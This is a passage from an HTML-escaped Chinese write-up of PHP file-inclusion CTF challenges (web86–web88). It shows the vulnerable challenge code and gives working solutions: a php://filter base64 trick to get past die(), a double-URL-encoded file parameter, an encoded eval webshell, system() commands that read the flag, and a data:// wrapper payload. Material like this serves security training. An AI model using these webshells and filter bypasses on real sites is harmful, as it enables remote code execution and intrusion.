&lt;li&gt;&lt;code&gt;dirname(__FILE__)&lt;/code&gt; 返回当前文件所在目录的绝对路径，比如 &lt;code&gt;/var/www/html&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;因此，这条语句是将当前文件所在目录路径赋值为常量 &lt;code&gt;&amp;#39;还要秀？&amp;#39;&lt;/code&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;code&gt;set_include_path(还要秀？);&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;set_include_path()&lt;/code&gt; 是 PHP 用来设置 &lt;strong&gt;&lt;code&gt;include 路径&lt;/code&gt;&lt;/strong&gt; 的函数，也就是 &lt;code&gt;include&lt;/code&gt;、&lt;code&gt;require&lt;/code&gt; 等函数查找文件的目录。&lt;/li&gt;
&lt;li&gt;参数是一个字符串，表示新的包含路径。&lt;/li&gt;
&lt;li&gt;这里传入了常量 &lt;code&gt;还要秀？&lt;/code&gt; （之前定义的当前目录路径）。&lt;/li&gt;
&lt;li&gt;也就是说，&lt;code&gt;include_path&lt;/code&gt; 被设置成了当前脚本所在的目录。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;设置 PHP 的包含路径为当前文件的目录路径。这样在后续代码中使用 &lt;code&gt;include()&lt;/code&gt;  时，可以省略文件的完整路径，只需提供文件名。&lt;/p&gt;
&lt;p&gt;当使用 &lt;code&gt;include()&lt;/code&gt;、&lt;code&gt;require()&lt;/code&gt;、&lt;code&gt;include_once()&lt;/code&gt; 或 &lt;code&gt;require_once()&lt;/code&gt; 时，如果提供的路径既不是绝对路径也不是相对路径，PHP 会首先在 &lt;code&gt;include_path&lt;/code&gt; 设置的目录中查找文件。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题解同web82&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250809001850778.png&#34; alt=&#34;image-20250809001850778&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web87&#34;&gt;&lt;a href=&#34;#web87&#34; class=&#34;headerlink&#34; title=&#34;web87&#34;&gt;&lt;/a&gt;web87&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:57:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $content = $_POST[&amp;#39;content&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;data&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;:&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;.&amp;quot;, &amp;quot;???&amp;quot;, $file);
    file_put_contents(urldecode($file), &amp;quot;&amp;lt;?php die(&amp;#39;大佬别秀了&amp;#39;);?&amp;gt;&amp;quot;.$content);


&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;base64编码只包含64个可打印字符，而php解码base64时遇到不在其中的字符，会忽略掉，将合法字符进行组合变成一个字符串进行解码，所以&lt;code&gt;&amp;lt;?php die(&amp;#39;大佬别秀了&amp;#39;);?&amp;gt;&lt;/code&gt; 对其解码后，只有&lt;code&gt;phpdie&lt;/code&gt;六个字符组成字符串进行解码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;base64算法解码时是4个 &lt;code&gt;byte&lt;/code&gt;一组，为了绕过 &lt;code&gt;die&lt;/code&gt; ，需要在&lt;code&gt;content&lt;/code&gt; base64编码后的前面加上两个字母&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=php://filter/write=convert.base64-decode/resource=1.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;因为题目中有 &lt;code&gt;urldecode($file)&lt;/code&gt; ，所以我们需要对其进行两次URL编码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对一句话木马  &lt;code&gt;&amp;lt;?php @eval($_POST[a]);?&amp;gt;&lt;/code&gt; 进行base64编码得到&lt;code&gt;PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==&lt;/code&gt;并在前面加上两个字母&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;之后可实现远程代码执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;a=system(&amp;quot;ls&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250809141916723.png&#34; alt=&#34;image-20250809141916723&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;a=system(&amp;quot;tac fl0g.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250809141949995.png&#34; alt=&#34;image-20250809141949995&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web88&#34;&gt;&lt;a href=&#34;#web88&#34; class=&#34;headerlink&#34; title=&#34;web88&#34;&gt;&lt;/a&gt;web88&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-17 02:27:25
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

 */
if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    if(preg_match(&amp;quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\-|\_|\+|\=|\./i&amp;quot;, $file))&amp;#123;
        die(&amp;quot;error&amp;quot;);
    &amp;#125;
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将 &lt;code&gt;&amp;lt;?php system(“ls”); ?&amp;gt;&lt;/code&gt; 经base64编码得 &lt;code&gt;PD9waHAgc3lzdGVtKCJscyIpOyA/Pg==&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;由于过滤符号，所以将  &lt;code&gt;==&lt;/code&gt; 去掉&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA/Pg
&lt;/code&gt;&lt;/pre&gt;
